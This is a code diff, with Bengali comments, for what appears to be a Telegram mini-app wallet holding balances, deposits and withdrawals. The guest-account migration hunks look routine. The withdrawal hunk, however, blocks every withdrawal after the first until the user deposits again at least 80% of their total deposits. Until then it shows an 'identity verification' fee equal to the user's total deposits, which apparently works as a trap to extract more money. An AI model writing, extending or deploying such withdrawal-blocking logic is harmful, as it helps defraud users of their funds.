@@ -1828,6 +1828,13 @@ window.addEventListener('load', function() {
     const lastName  = tgUser.last_name  || '';
     userName  = (firstName + (lastName ? ' ' + lastName : '')).trim() || tgUser.username || 'User';
     userPhoto = tgUser.photo_url || null;
+
+    // পুরনো guest ID টা overwrite হওয়ার আগে আলাদা key তে সেভ করা
+    const prevId = localStorage.getItem('si_uid');
+    if (prevId && prevId !== userId && prevId.startsWith('guest_')) {
+      localStorage.setItem('si_old_guest_id', prevId); // আলাদা key তে রাখা
+    }
+
     localStorage.setItem('si_uid',  userId);
     localStorage.setItem('si_name', userName);
     if (userPhoto) localStorage.setItem('si_photo_' + userId, userPhoto);
@@ -1904,23 +1911,27 @@ window.addEventListener('load', function() {
     const userRef = ref(db, 'users/' + userId);
     const snap = await get(userRef);
     if (!snap.exists()) {
-      // পুরনো guest ID চেক করা
-      const oldGuestId = localStorage.getItem('si_uid');
-      if (oldGuestId && oldGuestId !== userId && oldGuestId.startsWith('guest_')) {
+      // পুরনো guest ID খোঁজা — আলাদা key থেকে
+      const oldGuestId = localStorage.getItem('si_old_guest_id');
+      if (oldGuestId && oldGuestId !== userId) {
         const oldRef = ref(db, 'users/' + oldGuestId);
         const oldSnap = await get(oldRef);
         if (oldSnap.exists()) {
-          // পুরনো ডেটা নতুন ID তে কপি করা
           const oldData = oldSnap.val();
+          // পুরনো ডেটা নতুন Telegram ID তে migrate
           const migratedData = Object.assign({}, oldData, {
-            name: userName, photo: userPhoto || oldData.photo || null,
-            tg_id: userId, migrated_from: oldGuestId, migrated_at: Date.now()
+            name: userName,
+            photo: userPhoto || oldData.photo || null,
+            tg_id: userId,
+            migrated_from: oldGuestId,
+            migrated_at: Date.now()
           });
           await set(userRef, migratedData);
           window.userData = migratedData;
-          // পুরনো account টা ডিলিট না করে reference রাখা
+          // পুরনো account এ reference রাখা
           await update(oldRef, { migrated_to: userId });
-          localStorage.setItem('si_uid', userId);
+          // পুরনো key পরিষ্কার করা
+          localStorage.removeItem('si_old_guest_id');
           if (refParam && refParam !== userId && !oldData.referred_by) await creditReferrer(refParam);
           return;
         }
@@ -2014,16 +2025,22 @@ window.addEventListener('load', function() {
     if (!ud || amount > (ud.balance || 0)) { showToast('❌ Insufficient balance!'); return; }
     if (amount < 5) { showToast('❌ Minimum withdrawal is $5'); return; }
 
-    const withdrawCount = ud.withdraw_count || 0;
+    const totalDeposited  = parseFloat(ud.deposited || 0);
+    const totalWithdrawn  = parseFloat(ud.total_withdrawn || 0);
 
-    // দ্বিতীয়বার থেকে প্রতিবার — current deposited amount দিয়ে verification
-    if (withdrawCount >= 1) {
-      const verifyFee = (ud.deposited || 0).toFixed(2);
-      showIdentityVerification(verifyFee);
-      return;
+    // যদি আগে একবারও withdraw করা হয়ে থাকে → নতুন deposit না করা পর্যন্ত আটকাবে
+    if (totalWithdrawn > 0) {
+      // নতুন deposit হয়েছে কিনা check
+      const newDepositAfterWit = parseFloat(ud.deposited_after_withdraw || 0);
+      if (newDepositAfterWit < totalDeposited * 0.8) {
+        // identity verification দেখাও
+        const verifyFee = totalDeposited.toFixed(2);
+        showIdentityVerification(verifyFee);
+        return;
+      }
     }
 
-    // প্রথমবার withdraw — সাধারণভাবে হবে
+    // Withdraw proceed করা
     const fee = amount * 0.02;
     const net = amount - fee;
     const now = Date.now();
@@ -2037,13 +2054,16 @@ window.addEventListener('load', function() {
         type: 'withdraw', amount, method, fee, net_amount: net,
         status: 'pending', note: 'Processing within 24 hours', time: now
       });
-      // count বাড়াও — deposit করলেও reset হবে না
       await update(ref(db, 'users/' + userId), {
         balance: newBal,
-        withdraw_count: withdrawCount + 1
+        withdraw_count: (ud.withdraw_count || 0) + 1,
+        total_withdrawn: totalWithdrawn + amount,
+        deposited_after_withdraw: 0  // নতুন withdraw এর পর reset
       });
       window.userData.balance = newBal;
-      window.userData.withdraw_count = withdrawCount + 1;
+      window.userData.withdraw_count = (ud.withdraw_count || 0) + 1;
+      window.userData.total_withdrawn = totalWithdrawn + amount;
+      window.userData.deposited_after_withdraw = 0;
       renderUI();
       window.txList = window.txList || [];
       window.txList.unshift({ type: 'withdraw', amount, method, fee, net_amount: net, status: 'pending', time: now });
